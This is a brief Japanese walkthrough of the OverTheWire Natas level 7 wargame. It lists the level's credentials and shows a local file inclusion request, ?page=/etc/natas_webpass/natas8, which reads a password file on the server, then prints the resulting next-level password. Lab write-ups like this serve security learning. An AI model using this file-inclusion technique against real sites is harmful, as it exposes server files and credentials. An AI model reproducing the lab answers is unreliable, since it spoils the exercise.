# Natas7
```
Username: natas7
Password: bmg8SvU1LizuWjx3y7xkNERkHxGre0GS
URL:      http://natas7.natas.labs.overthewire.org
```
`Home`と`About`しかないが、Devtoolを開いてソースを見ると  
`<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->`  
「natas8のパスワードは`/etc/natas_webpass/natas8`にあるよ！」とヒントが書かれている。

HomeもしくはAboutを踏んだ後のURLを見ると、URL末尾が`?page=home`となっており、ここにnatas8のパスワードが書かれたページを入れて読み込ませれば良い。  
`http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8`  
へアクセスすると答えが得られる。
```
xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q
```